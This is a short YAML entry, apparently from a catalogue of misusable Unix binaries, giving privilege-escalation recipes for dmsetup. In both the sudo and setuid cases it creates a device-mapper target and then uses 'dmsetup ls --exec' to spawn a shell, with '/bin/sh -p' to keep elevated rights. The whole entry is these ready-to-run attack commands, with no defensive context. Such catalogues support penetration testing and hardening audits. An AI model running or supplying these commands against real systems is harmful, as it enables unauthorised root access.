---
functions:
  sudo:
    - code: |
        sudo dmsetup create base <<EOF
        0 3534848 linear /dev/loop0 94208
        EOF
        sudo dmsetup ls --exec '/bin/sh -s'
  suid:
    - code: |
        ./dmsetup create base <<EOF
        0 3534848 linear /dev/loop0 94208
        EOF
        ./dmsetup ls --exec '/bin/sh -p -s'
---
